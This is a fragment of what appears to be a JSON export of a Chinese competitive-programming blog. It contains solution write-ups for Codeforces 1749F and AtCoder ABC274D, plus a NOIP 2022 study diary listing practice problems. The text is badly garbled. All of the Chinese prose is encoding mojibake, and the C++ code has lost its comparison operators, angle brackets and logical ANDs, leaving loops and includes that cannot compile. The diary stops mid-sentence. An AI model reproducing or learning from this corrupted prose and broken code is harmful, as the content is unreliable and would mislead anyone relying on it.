Path","path":"/2022/11/14/CF1749F/","content":"éƒ¨åˆ†å‚è€ƒäº† è¿™ç¯‡ xiangglå·¨ä½¬çš„åšå®¢ã€‚ ç”±äº $d \\le 20$ï¼Œè€ƒè™‘å°†ä¸ç­‰å…³ç³»çš„ä¿¡æ¯å­˜æ”¾åœ¨æ•°ç»„ä¸­ï¼Œè½¬æ¢ä¸ºæœ€å¤§è·ç¦» $d$ æ—¶çš„ä¿¡æ¯ã€‚è€ƒè™‘å•ç‹¬å¤„ç†æ¯ä¸€ä¸ªç‚¹æ—¶ï¼Œç›´æ¥æš´åŠ›ä¿®æ”¹ä¸æŸä¸€ç‚¹ $x$ è·ç¦»ä¸º $[0,d]$ çš„ç‚¹ï¼Œæ­¤æ—¶ä¸éš¾åˆ†æå‡ºæ—¶é—´å¤æ‚åº¦ä¸º $O(qnd)$ã€‚ ç”±äºæ˜¯åŒºé—´æ›´æ–°ï¼Œéœ€è¦åŒæ—¶æ›´æ–° $x \\to y$ è¿™æ¡é“¾ä¸Šçš„ç‚¹ï¼Œä¹Ÿå°±æ˜¯æç¤ºè¦ç”¨æ•°æ®ç»“æ„å»ç»´æŠ¤ã€‚å°†å•ç‚¹æ•°æ®çš„å¤„ç†åˆ†ä¸ºå­æ ‘å†…ä¸å­æ ‘å¤–ä¸¤ç§æƒ…å†µè¿›è¡Œåˆ†ç±»è®¨è®ºã€‚ å¯¹äºåœ¨å­æ ‘å†…çš„ç‚¹ï¼Œå€˜è‹¥æ˜¯ä¸€æ®µè¿ç»­çš„åŒºé—´ï¼Œåˆ™å¯ä»¥åˆ©ç”¨æ•°æ®ç»“æ„ä¸€æ¬¡æ›´æ–°å®Œæ¯•ã€‚ä¸éš¾æƒ³åˆ°åˆ©ç”¨æ ‘é“¾å‰–åˆ†ç»´æŠ¤ $\\texttt{dfs}$ åºï¼Œè¿™æ ·å­æ ‘å†…çš„ $\\texttt{dfs}$ åºä¾¿æ˜¯è¿ç»­çš„ã€‚åˆ©ç”¨å¸¸æ•°è¾ƒå°çš„æ ‘çŠ¶æ•°ç»„ï¼Œè®¾ $c_{i,j}$ å­˜çš„æ˜¯æœ€å¤§è·ç¦»ä¸º $i$ æ—¶æ¯ä¸€ä¸ªç‚¹äº§ç”Ÿçš„è´¡çŒ®ã€‚åˆ™åœ¨ä¸€æ¬¡å¤„ç†æ—¶ç›´æ¥æ›´æ–° $x,y,\\rm{LCA(x,y)}$ ä¸‰ç‚¹å³å¯ï¼Œä¹Ÿå°±æ˜¯ modify (c[d],x,k);modify (c[d],y,k);modify (c[d],LCA(x,y),-2 * k)ï¼Œå…¶ä¸­ modify å‡½æ•°å³ä¸ºæ ‘çŠ¶æ•°ç»„çš„æ“ä½œã€‚ç”¨ in[x] å’Œ out[x] åˆ†åˆ«è¡¨ç¤ºç¬¬ä¸€æ¬¡å’Œæœ€åä¸€æ¬¡ç»è¿‡ $x$ ç‚¹æ—¶çš„ $\\texttt{dfs}$ åºï¼Œå› æ­¤åœ¨æŸ¥è¯¢ç­”æ¡ˆæ—¶å­æ ‘å†…çš„è´¡çŒ®å³ç”¨å·®åˆ†çš„æ€æƒ³è¿›è¡Œæ ‘çŠ¶æ•°ç»„ç»´æŠ¤æ“ä½œã€‚ å¯¹äºåœ¨å­æ ‘å¤–çš„ç‚¹ï¼Œæ˜¾ç„¶éƒ½å¯ä»¥å½’ç»“åˆ° $z = \\rm LCA(x,y)$ è¿™ä¸€ç‚¹äº§ç”Ÿçš„è´¡çŒ®ã€‚ç”±äºæ˜¯å•ç‚¹ï¼Œç›´æ¥è¿›è¡Œæš´åŠ›ä¿®æ”¹ã€‚è®¾ $dp_{i,j}$ è¡¨ç¤ºä»¥ $i$ ä¸ºæ ¹è·ç¦»ä¸º $j$ æ—¶çš„è´¡çŒ®çš„æƒå€¼ã€‚ä» $z$ å¼€å§‹å‘ä¸Šèµ°ï¼Œ$z$ å¯¹ä¸Šé¢è·ç¦»ä¸è¶…è¿‡ $j$ çš„èŠ‚ç‚¹äº§ç”Ÿå½±å“ï¼Œç„¶åå‘ç°ï¼Œ$z$ çš„çˆ¶äº²ä¼šå¯¹è·ç¦»ä¸è¶…è¿‡ $j - 2$ çš„èŠ‚ç‚¹äº§ç”Ÿçš„å½±å“è¢«é‡å¤è®¡ç®—ï¼Œç›´æ¥è¿›è¡Œå®¹æ–¥å³å¯ï¼ˆéœ€è¦å‡å»çš„æ¡ä»¶æ˜¯è·ç¦»è¶…è¿‡ $j - 2$ ä¸” $z$ ä¸Šæ–¹è¿˜å­˜åœ¨èŠ‚ç‚¹ï¼‰ã€‚ ç»¼ä¸Šåˆ†æï¼Œå­æ ‘å†…ä¿®æ”¹ä¸º $O(q\\log n)$ï¼ŒæŸ¥è¯¢ä¸º $O(qd \\log n)$ï¼›å­æ ‘å¤–ä¿®æ”¹ä¸º $O(qd)$ï¼ŒæŸ¥è¯¢ä¸º $(qd)$ï¼Œç”±äº $n,q$ åŒé˜¶ï¼Œ$d,\\log n$ å¤§å°ç›¸è¿‘ï¼Œæ‰€ä»¥æœ€åçš„æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log^2 n)$ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define lowbit(x) x (-x)using namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,cnt,in[MAX],out[MAX],top[MAX],sz[MAX],hson[MAX],f[MAX],dep[MAX],dp[MAX][25],c[25][MAX]; vector int ve[MAX];void dfs1 (int u,int fa);void dfs2 (int u,int fa);int lca (int u,int v);void modify (int tr[],int x,int v);int query (int tr[],int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i n;++i) int x = read (),y = read (); ve[x].push_back (y);ve[y].push_back (x); dfs1 (1,0); in[1] = ++cnt,top[1] = 1; dfs2 (1,0); //for (int i = 1;i = n;++i) coutin[i] out[i]endl; m = read (); for (int i = 1;i = m;++i) int ty = read (); if (ty == 1) int x = read (),ans = 0,p = 0; for (int i = 0;i = 20;++i) ans += query (c[i],out[x]) - query (c[i],in[x] - 1);//å·®åˆ†æ€æƒ³ for (int j = p;j = 20;++j) ans += dp[x][j];//æ¯å‘ä¸Šèµ°ä¸€æ¬¡ï¼Œè·ç¦»è‡³å°‘ä¸º p ++p;x = f[x]; if (!x) break;//å‘ä¸Šé¢å·²ç»æ²¡æœ‰èŠ‚ç‚¹å°±åœæ­¢ printf (%d ,ans); else int u = read (),v = read (),k = read (),d = read (); int z = lca (u,v); modify (c[d],in[u],k);modify (c[d],in[v],k);modify (c[d],in[z],-2 * k);//é‡å¤éƒ¨åˆ†çš„å»é™¤ for (int i = d;~i;--i) dp[z][i] += k; if (i - 2 = 0 f[z]) dp[z][i - 2] -= k;//å®¹æ–¥ è·ç¦» = i - 2 ä¸” z ä¸Šè¿˜æœ‰èŠ‚ç‚¹ z = f[z]; if (!z) break; return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void dfs1 (int u,int fa)//æ ‘é“¾å‰–åˆ† dep[u] = dep[fa] + 1; f[u] = fa;sz[u] = 1; for (auto v : ve[u]) if (v == fa) continue; dfs1 (v,u); sz[u] += sz[v]; if (sz[v] sz[hson[u]]) hson[u] = v; void dfs2 (int u,int fa) if (hson[u]) in[hson[u]] = ++cnt;//dfs åº top[hson[u]] = top[u]; dfs2 (hson[u],u); for (auto v : ve[u]) if (top[v]) continue; in[v] = ++cnt; top[v] = v; dfs2 (v,v); out[u] = cnt;//dfs åºint lca (int u,int v)//æ ‘é“¾å‰–åˆ†æ±‚ LCA int fx = top[u],fy = top[v]; while (fx != fy) if (dep[fx] dep[fy]) swap (fx,fy),swap (u,v); u = f[fx],fx = top[u]; if (dep[u] dep[v]) swap (u,v); return u;void modify (int tr[],int x,int v) for (int i = x;i = n;i += lowbit (i)) tr[i] += v;int query (int tr[],int x) int sum = 0;for (int i = x;i;i -= lowbit (i)) sum += tr[i];return sum;//æ ‘çŠ¶æ•°ç»„åŸºæœ¬æ“ä½œ","categories":["Solution"]},{"title":"é¢˜è§£ï¼š[ABC274D] Robot Arms 2","path":"/2022/10/23/ABC274D/","content":"é¦–å…ˆæé†’ä¸€ä¸‹ä¸è¦è¯»é”™é¢˜ç›®ï¼Œå› ä¸ºé¢˜ç›®å¹¶æ²¡æœ‰è¦æ±‚æ—‹è½¬ $90$ åº¦æ˜¯é¡ºæ—¶é’ˆè¿˜æ˜¯é€†æ—¶é’ˆã€‚ å°† $dx,dy$ åˆ†å¼€è€ƒè™‘ï¼Œé¢˜ç›®è½¬æ¢ä¸º $dx = A_1,dy = 0$ï¼Œç„¶å $A_{2i + 1},A_{2i} (i 0)$ åˆ†åˆ«å¯¹ $dx,dy$ äº§ç”Ÿå½±å“ï¼Œé—®èƒ½å¦å‡‘æˆé¢˜ç›®æ‰€æ±‚çš„æ•° $(x,y)$ã€‚å°è¯• $\\texttt{dp}$ï¼Œè‹¥æŸä¸€ç»´çš„ $x$ å¯ä»¥å¾—åˆ°ï¼Œé‚£ä¹ˆå¯¹äºæœ¬è½®çš„ $A$ï¼Œå¯ä»¥å¾—åˆ° $x - A$ ä¸ $x + A$ï¼Œè½¬ç§»çš„æ—¶å€™ç›´æ¥æšä¸¾ä¸Šä¸€è½®æ‰€æœ‰è¢«æ ‡è®°çš„ä½ç½®å³å¯ã€‚ä¸ºäº†æ–¹ä¾¿è´Ÿæ•°çš„æ“ä½œï¼Œç›´æ¥ä½¿ç”¨ map å­˜å‚¨ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include map#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e3 + 5;const int MOD = 1e9 + 7;inline int read ();int n,x,y,dx,dy,a[MAX];map int,int dpx[MAX],dpy[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();x = read ();y = read (); for (int i = 1;i = n;++i) a[i] = read (); //åæ ‡x y åˆ†å¼€è€ƒè™‘ dpx[1][a[1]] = 1;//åˆå§‹åŒ– for (int i = 3;i = n;i += 2) for (auto j : dpx[i - 2])//ç”±ä¸Šä¸€è½®å¾—åˆ°çš„æ•°è¿›è¡Œè½¬ç§» dpx[i][j.first + a[i]] = dpx[i][j.first - a[i]] = 1; dpy[0][0] = 1;//åˆå§‹åŒ– for (int i = 2;i = n;i += 2) for (auto j : dpy[i - 2]) dpy[i][j.first + a[i]] = dpy[i][j.first - a[i]] = 1; if (dpx[(n 1) ? n : n - 1].count (x) dpy[(n 1) ? n - 1 : n].count (y)) puts (Yes); else puts (No); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"2022 NOIP å¤‡èµ›è®°","path":"/2022/10/04/NOIP2022/","content":"å‰è¨€å·²ç»é«˜äºŒäº†ï¼Œä¾æ—§æ˜¯è’Ÿè’»ã€‚åº”è¯¥æ˜¯æœ€åä¸€æ¬¡æ¯”èµ›äº†ï¼Œæ‰€ä»¥æ‰“ç®—æ‹¼ä¸€æŠŠã€‚ å°±ä»å›½åº†è¿™ä¸€å¤©å¼€å§‹å†™èµ·å§ã€‚æ²¡å•¥é€»è¾‘ï¼Œæƒ³åˆ°å•¥å°±è¯´ç‚¹å•¥ï¼Œä¹Ÿç®—æ˜¯è®°å½•ä¸€ä¸‹ä¸€ä¸ªä¿¡ç«ç”Ÿçš„æ—¥å¸¸å§ã€‚ $\\texttt{2022.10.01}$å¤§æ¦‚æ˜¯å¼€å§‹é›¶ç¢çš„å¤ä¹ äº†ã€‚ å…ˆä»æ ‘é“¾å‰–åˆ†å…¥æ‰‹ï¼Œå¤§æ¦‚æ˜¯æ¯å¤©ç ä¸€é¢˜çš„æ ·å­ï¼Œä½†æ˜¯å¼±æ™ºçš„é”™è¯¯è¿˜æ˜¯æ¥è¿ä¸æ–­ã€‚ä»€ä¹ˆè¯¢é—®ä¸‹æ ‡æ²¡ç”¨æ”¹æˆ $\\texttt{dfn}$ åºå•Šï¼Œæ·±æœå†™çš„æ—¶å€™å¿˜è®°æ›´æ–°é‡å„¿å­å¯¼è‡´å‰–åˆ†äº†ä¸ªå¯‚å¯å•Šç­‰ç­‰é—®é¢˜æ˜¯å±‚å‡ºä¸ç©·ã€‚å¤§æ¦‚æŠŠå‰–åˆ†çš„åŸºç¡€é¢˜å·®ä¸å¤šå†™äº†ä¸€éã€‚ æ ‘é“¾å‰–åˆ†å¾€å¾€å’Œçº¿æ®µæ ‘ç›¸ç»“åˆï¼Œæ‰€ä»¥è¯´ä¸‹æ ‡çš„é—®é¢˜è¦å€¼å¾—æ³¨æ„ï¼Œå› ä¸ºå‰–åˆ†å¤§å¤šä¾èµ–çš„æ˜¯ $\\texttt{dfs}$ åçš„ $\\texttt{dfn}$ åºã€‚åœ¨å†™è¯¢é—®çš„æ—¶å€™ï¼Œæ€»æ˜¯è®°ä¸æ¸…æ¥š if (dep[fx] dep[fy]) swap (fx,fy),swap (x,y); è¿™ä¸ªäº¤æ¢çš„é¡ºåºï¼Œè®¤çœŸçš„ç†è§£äº†ä¸€ä¸‹ï¼Œç°åœ¨åº”è¯¥èƒ½æ˜ç™½äº†ã€‚while (fx != fy) å¾ªç¯é‡Œçš„äº¤æ¢ï¼Œé»˜è®¤ $x$ çš„æ·±åº¦å¤§äº $y$ï¼Œæ‰€ä»¥æ˜¯è®© $x$ å‘ä¸Šè·³ï¼›è€Œå¾ªç¯å¤–çš„æœ€åä¸€æ¬¡äº¤æ¢ï¼Œç”±äºå·²ç»æ‰¾åˆ°äº†æœ€è¿‘å…¬å…±ç¥–å…ˆï¼Œæ‰€ä»¥æ–¹ä¾¿ç¼–å†™æˆ‘ä»¬è®© $x$ æˆä¸ºæ·±åº¦è¾ƒå°çš„é‚£ä¸ªï¼Œä»è€Œè¿›è¡Œçº¿æ®µæ ‘ä¸Šçš„æ“ä½œï¼ˆçº¿æ®µæ ‘çš„æ›´æ–°ä¸­ç¼–å·å°çš„æ˜¾ç„¶ $\\texttt{dfn}$ åºå°ï¼Œä¹Ÿå°±æ˜¯æ·±åº¦å°ï¼‰ã€‚ åšé¢˜æ—¶é‡åˆ°ä¸€ç±»éœ€è¦è¿›è¡Œä¸è¾¹æƒç›¸å…³çš„æ“ä½œçš„é¢˜ç›®ï¼Œæœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„å¤„ç†æŠ€å·§â€”å°±æ˜¯æŠŠè¾¹æƒè½¬åˆ°æ·±åº¦è¾ƒå¤§çš„ç‚¹ä¸Šã€‚è€ƒè™‘ä¸€ä¸‹æ­£ç¡®æ€§ï¼Œæ¯ä¸€æ¡è¾¹éƒ½è¢«ä¸¤ä¸ªç‚¹ç›¸è¿ï¼Œæ‰€ä»¥ä¸€å®šèƒ½é€šè¿‡è¿™ç§æ–¹å¼å°†è¾¹æƒå…¨éƒ¨è¿›è¡Œè½¬åŒ–ï¼Œè€Œæ¯ä¸€ä¸ªç‚¹çš„æ·±åº¦åœ¨ç¬¬ä¸€ä¸ª $\\texttt{dfs}$ ä¸­å·²ç»è®°å½•ï¼Œæ‰€ä»¥ä¹Ÿä¸éœ€è¦å¢åŠ è¿‡å¤šçš„ä»£ç ã€‚ä¸è¿‡åœ¨æŸ¥è¯¢çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯ $\\texttt{LCA}$ é‚£ä¸ªç‚¹æ‰€å­˜çš„è¾¹ç›¸å½“äºæ˜¯å…¶ä¸Šæ–¹çš„è¾¹ï¼Œåœ¨è¯¢é—®æ˜¯å¹¶ä¸ä¼šç»è¿‡ï¼Œå› æ­¤åœ¨æŸ¥è¯¢æ—¶æœ€åä¸€æ¬¡æ›´æ–°å†™æˆ modify (1,1,n,dfn[x] + 1,dfn[y]) å°±èƒ½å®Œç¾çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚åŸå› å¾ˆç®€å•ï¼Œç”±æ ‘é“¾å‰–åˆ†æ±‚ $\\texttt{LCA}$ å¯çŸ¥ï¼Œæœ€åçš„é‚£ä¸ª $x$ å°±æ˜¯æœ€è¿‘å…¬å…±ç¥–å…ˆï¼Œåˆç”±äºé‡å„¿å­ä¼˜å…ˆçš„åŸåˆ™ï¼Œå­æ ‘å†…æ‰€æœ‰çš„ç‚¹çš„ $\\texttt{dfn}$ æ˜¯è¿ç»­çš„ï¼Œæ‰€ä»¥ç›´æ¥æŠŠè¿™ä¸ªç‚¹å»æ‰å³å¯ã€‚ ä¹ é¢˜åˆ—è¡¨ï¼š P4114 Qtree1 åŒ QTREE - Query on a tree è¾¹æƒè½¬ç‚¹æƒï¼Œå•ç‚¹æ›´æ–°ï¼ŒåŒºé—´æŸ¥è¯¢ã€‚ P4315 æœˆä¸‹â€œæ¯›æ™¯æ ‘â€ è¾¹æƒè½¬ç‚¹æƒï¼ŒåŒºé—´æ›´æ–°ï¼ŒåŒºé—´æŸ¥è¯¢ã€‚ P3038 [USACO11DEC]Grass Planting G åŒ SP12005 GRASSPLA - Grass Planting è¾¹æƒè½¬ç‚¹æƒï¼ŒåŒºé—´æ›´æ–°ï¼Œå•ç‚¹æŸ¥è¯¢ã€‚ P3178 [HAOI2015]æ ‘ä¸Šæ“ä½œ åŒºé—´æ›´æ–°ï¼ŒåŒºé—´æŸ¥è¯¢ã€‚ P3833 [SHOI2012]é­”æ³•æ ‘ åŒºé—´æ›´æ–°ï¼ŒåŒºé—´æŸ¥è¯¢ã€‚ CF343D Water Tree åŒºé—´æ›´æ–°ï¼Œå•ç‚¹æŸ¥è¯¢ã€‚ CF165D Beard Graph å•ç‚¹æ›´æ–°ï¼ŒåŒºé—´æŸ¥è¯¢ï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆã€‚ P3950 éƒ¨è½å†²çª å•ç‚¹æ›´æ–°ï¼ŒåŒºé—´æŸ¥è¯¢ï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆã€‚ P4116 Qtree3 è½»é‡é“¾å‰–åˆ†ï¼Œsetã€‚ $\\texttt{2022.10.05}$æ•°ä½ $\\texttt{dp}$ çš„ä¸€äº›ä¸­ç­‰é¢˜å…ˆå†™èµ·æ¥ï¼Œè¿™ç§é¢˜ç›®å¤§å¤šéƒ½æœ‰å¥—è·¯ï¼Œä¸€èˆ¬ç”¨è®°å¿†åŒ–æ¥å†™ã€‚ç»™ä¸ªæœ€ç®€å•çš„æ¨¡æ¿ï¼š ll dfs (int pos,bool limit,bool lead) if (pos cnt) return æ¡ä»¶; if (!limit ~dp[pos][sth.]) return dp[pos][sth.]; int res = limit ? a[cnt - pos + 1] : 9;ll sum = 0; for (int i = 0;i = res;++i) sum += dfs (pos + 1,(i == res) limit,(i == 0) lead); if (!limit) dp[pos][sth.] = sum; return sum; ä¸€ç±»é¢˜ç›®å¯ä»¥ç›´æ¥è¿›è¡Œè®°å¿†åŒ–ï¼Œè€Œä¸€ç±»é¢˜ç›®éœ€è¦é€šè¿‡åˆç†çš„çŠ¶æ€è®¾è®¡ä»è€Œå°†å…¶è¿›è¡Œè½¬ç§»å¹¶è®°å½•ã€‚ ä¹ é¢˜åˆ—è¡¨ï¼š P4127 [AHOI2009]åŒç±»åˆ†å¸ƒ æšä¸¾å„ä½æ•°ä¹‹å’Œæ¥å……å½“æ¨¡æ•°ï¼Œä»è€Œè¿›è¡Œè®°å¿†åŒ–ã€‚ P4317 èŠ±ç¥çš„æ•°è®ºé¢˜ æšä¸¾äºŒè¿›åˆ¶æ•°ä¸­ $1$ çš„ä¸ªæ•°ï¼Œè®¾ $f[i]$ è¡¨ç¤ºæœ‰ $i$ ä¸ª $1$ çš„æ•°çš„ä¸ªæ•°ï¼Œä¹‹åæ ¹æ®ä¹˜æ³•åŸç†ç”¨å¿«é€Ÿå¹‚æ±‚è§£ã€‚ P6218 [USACO06NOV] Round Numbers S è®°å½• $0$ ä¸ $1$ çš„ä¸ªæ•°åˆ°è¾¾è¾¹ç•Œæ—¶è¿›è¡Œæ¯”è¾ƒå³å¯ã€‚ P4124 [CQOI2016]æ‰‹æœºå·ç  è®°å½•å‰ä¸¤ä½æ•°ä»¥åŠä¸èƒ½å‡ºç°çš„æ•°è¿™å››ä¸ªä¿¡æ¯ã€‚æ³¨æ„å‰å¯¼é›¶çš„å¤„ç†ï¼Œå¯ä»¥ç›´æ¥å¾ªç¯æšä¸¾ç¬¬ä¸€ä½ç„¶åå†å»æœç´¢ï¼ŒåŒæ—¶éœ€è¦åˆ¤æ–­ä½æ•°ï¼ˆ$L = 10^{10}$ æ—¶ï¼Œ$L - 1$ çš„ä½æ•°ä¾¿ä¸å†ç¬¦åˆï¼‰ã€‚ $\\texttt{2022.10.09}$å›½åº†å›æ¥ç«Ÿç„¶å°±è¦æœˆè€ƒï¼Œä¸€é€šä¹±è€ƒï¼Œæ™šä¸Šè¿˜æ˜¯æ¥æœºæˆ¿åˆ·é¢˜ã€‚æ¥ç€å›åˆ°æ•°æ®ç»“æ„ï¼Œå†æ¥çœ‹çœ‹æ ‘çŠ¶æ•°ç»„ã€‚ è¯´åˆ°æ ‘çŠ¶æ•°ç»„ï¼Œæ€»æ˜¯ä¼šä¸é€†åºå¯¹è”ç³»åœ¨ä¸€èµ·ï¼Œæ¯•ç«Ÿå¤ªç»å…¸äº†ã€‚åŒæ—¶ï¼Œæ ‘çŠ¶æ•°ç»„çš„é¢˜ç›®å¾€å¾€ä¼´éšç€ç¦»æ•£åŒ–ï¼ˆè¦ä¸å°± $\\texttt{MLE}$ äº†å˜›ï¼‰ã€‚å¼„æ¸…æ¥šæ ‘çŠ¶æ•°ç»„å“ªé‡Œéœ€è¦ +1 æˆ– -1ï¼Œä¼°è®¡ä¹Ÿå°±æ²¡ä»€ä¹ˆå¤§çš„é—®é¢˜äº†ã€‚ ä¸€èˆ¬æ¥è¯´ï¼ŒæŸ¥è¯¢ query (x) è¡¨ç¤ºæ±‚å°äºç­‰äº $x$ çš„æ•°ç›¸å…³çš„å†…å®¹ï¼Œæ‰€ä»¥æ±‚å°äºæ—¶éœ€è¦ -1ã€‚åˆå› ä¸ºæ ‘çŠ¶æ•°ç»„çš„åŒºé—´æŸ¥è¯¢æ˜¯åŸºäºå·®åˆ†çš„æ€æƒ³ï¼Œè¦å‡å»å·¦ç«¯ç‚¹ä¹‹å‰çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥è¯´ä¹Ÿè¦ -1ã€‚ä¼¼ä¹æœ€å¸¸è§çš„æƒ…å†µå°±åªæœ‰è¿™ä¹ˆå¤šï¼Œå…ˆå†™è¿™äº›å§ã€‚ ç”±äºçº¿æ®µæ ‘ä¸æ ‘çŠ¶æ•°ç»„éƒ½æ¯”è¾ƒå¸¸è€ƒï¼Œæ¥ä¸‹æ¥å‡ å¤©é‡Œï¼Œå°±åšåšæœ‰å…³çš„é¢˜ç›®å§ã€‚ ä¹ é¢˜åˆ—è¡¨ï¼š P6186 [NOI Online #1 æé«˜ç»„] å†’æ³¡æ’åº ä¸é€†åºå¯¹ç›¸ç»“åˆï¼Œè®°å½• $k[i]$ è¡¨ç¤ºé€†åºå¯¹æ•°ä¸º $x$ çš„ä½ç½®çš„ä¸ªæ•°ï¼Œç„¶åé€šè¿‡æ‰¾è§„å¾‹å‘ç° $c$ è½®çš„æ’åºä¼šå°‘ $\\sum_{i = 1}^{c} k[i]$ ä¸ªé€†åºå¯¹ï¼Œæœ€åé€šè¿‡æ ‘çŠ¶æ•°ç»„ç»´æŠ¤æ¯æ¬¡æ“ä½œäº§ç”Ÿçš„å½±å“ã€‚ P3586 [POI2015] LOG é€šè¿‡æ‰¾è§„å¾‹å‘ç°è¦ç»´æŠ¤çš„æ˜¯ $\\ge s$ çš„æ•°çš„ä¸ªæ•°ä»¥åŠ $ s$ çš„æ•°çš„å’Œã€‚éœ€è¦ç¦»æ•£åŒ–ï¼Œæ‰€ä»¥å¦‚æœæ˜¯åœ¨çº¿æ“ä½œçš„è¯åº”è¯¥ç”¨å¹³è¡¡æ ‘å»ç»´æŠ¤ã€‚ P4054 [JSOI2009] è®¡æ•°é—®é¢˜ äºŒç»´æ ‘çŠ¶æ•°ç»„ï¼Œå†™èµ·æ¥å’Œä¸€ä½çš„å·®ä¸å¤šï¼ŒåŒæ—¶å†å¤šå¼€ä¸€ç»´æ•°ç»„è®°å½•é¢œè‰²çš„ä¿¡æ¯ï¼ŒæŸ¥è¯¢çš„æ—¶å€™ç”¨å·®åˆ†çš„æ€æƒ³å»è§£å†³é—®é¢˜å³å¯ã€‚å•ç‚¹ä¿®æ”¹ï¼ŒåŒºé—´æŸ¥è¯¢ã€‚ P4514 ä¸Šå¸é€ é¢˜çš„ä¸ƒåˆ†é’Ÿ åŒºé—´ä¿®æ”¹ï¼ŒåŒºé—´æŸ¥è¯¢ã€‚ä»¤ $d[i] = a[i] - a[i - 1]$ï¼Œåˆ™æœ‰ $\\sum_{i = 1}^{k} d[k] = a[k]$ï¼Œä¿®æ”¹æ—¶åˆ†åˆ«å¤„ç† $l$ ä¸ $r + 1$ å³å¯ã€‚åŒæ ·çš„ï¼Œæ‰©å±•åˆ°äºŒç»´æ—¶ï¼ŒäºŒç»´å‰ç¼€å’Œå˜ä¸º $\\sum \\limits_{i = 1}^{x}\\sum\\limits_{j = 1}^{y}\\sum\\limits_{k = 1}^{i}\\sum\\limits_{l = 1}^{j} d[k][l] = \\sum \\limits_{i = 1}^{x}\\sum\\limits_{j = 1}^{y} d[i][j] \\times (x - i + 1)(y - j + 1) = \\sum \\limits_{i = 1}^{x}\\sum\\limits_{j = 1}^{y} (x +1)(y + 1)\\times d[i][j] + (x + 1)j\\times d[i][j] - (y + 1)i\\times d[i][j] + ij \\times d[i][j]$ã€‚å› æ­¤å¼€å››ä¸ªæ ‘çŠ¶æ•°ç»„åˆ†åˆ«ç»´æŠ¤è¿™å››ä¸ªä¿¡æ¯ï¼Œæœ€åè¿˜åŸå·®åˆ†åºåˆ—å³å¯ã€‚ P1637 ä¸‰å…ƒä¸Šå‡å­åºåˆ— æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ï¼Œéå†ä¸­é—´çš„é‚£ä¸ªæ•°å­—ï¼Œç„¶åæ­£åä¸¤è¾¹å¾ªç¯åˆ†åˆ«ç”¨æ ‘çŠ¶æ•°ç»„ç»´æŠ¤æ¯”å…¶å¤§ï¼ˆå°ï¼‰çš„æ•°çš„ä¸ªæ•°ï¼Œæ ¹æ®ä¹˜æ³•åŸç†å¾—å‡ºç­”æ¡ˆã€‚ P3605 [USACO17JAN]Promotion Counting P å®¹æ˜“æƒ³åˆ°é€€åŒ–æˆé“¾æ—¶å˜ä¸ºæ±‚é€†åºå¯¹çš„ä¸ªæ•°ã€‚ç±»ä¼¼çš„ï¼Œç¦»æ•£åŒ–ä¹‹åç”¨æ ‘çŠ¶æ•°ç»„ç»´æŠ¤æ¯”æŸä¸€èŠ‚ç‚¹å¤§çš„æ•°çš„ä¸ªæ•°ï¼Œç”¨ dfs å‰åçš„å€¼ä½œå·®å¾—åˆ°ç­”æ¡ˆã€‚ UVA12983 The Battle of Chibi åŒ CF597C Subsequences ä¸éš¾æƒ³åˆ° $O(kn^2)$ çš„æœ´ç´  $\\texttt{DP}$ï¼Œ$dp_{i,j}$ è¡¨ç¤ºå‰ $i$ ä¸ªæ•°ä¸­ä»¥ $i$ ç»“å°¾çš„ä¸”é•¿åº¦ä¸º $j$ çš„ä¸¥æ ¼ä¸Šå‡åºåˆ—ã€‚ç„¶åå‘ç° $dp_{i,j}$ ä¼šç”± $dp_{i,j - 1}$ å¾—åˆ°ï¼Œå› æ­¤å¯ä»¥ç”¨æ•°æ®ç»“æ„ä¼˜åŒ– $\\texttt{DP}$ã€‚å¯¹äºç¬¬ $i$ ä¸ªæ•°ï¼Œéœ€è¦æ‰¾åˆ°æ¯”å®ƒå°ä¸”åœ¨å®ƒå‰é¢çš„èŠ‚ç‚¹ï¼Œä¸éš¾æƒ³åˆ°ä½¿ç”¨æ ‘çŠ¶æ•°ç»„ç»´æŠ¤ã€‚åŒæ—¶ï¼Œå¯ä»¥ç”¨æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ç©ºé—´ï¼Œå¾—åˆ°æœ€åçš„æ—¶é—´å¤æ‚åº¦ä¸º $O(kn \\log n)$ çš„ä»£ç ã€‚ P5200 [USACO19JAN]Sleepy Cow Sorting G ä¸é”™çš„æ€ç»´é¢˜ã€‚æ‰‹æ¨¡å°±èƒ½å‘ç°ï¼Œæœ€å°‘çš„æ•°ç›®æ˜¯å€’åºç¬¬ä¸€ä¸ªå‡ºç° $a_i a_{i + 1}$ çš„ $i$ï¼Œç›¸å½“äº $i$ ä¹‹åçš„éƒ½å·²ç»æœ‰åºï¼Œä¸éœ€è¦ç§»åŠ¨ã€‚è¾“å‡ºæ–¹æ¡ˆæ—¶ï¼Œç”±äºéœ€è¦ç§»åˆ°æœ‰åºæ•°ç»„ä¸­çš„æŸä¸€ä½ç½®ï¼Œå› æ­¤éœ€è¦çŸ¥é“ç§»åŠ¨æ—¶æ¯”å®ƒå°çš„æ•°çš„ä¸ªæ•°ï¼Œç”¨æ 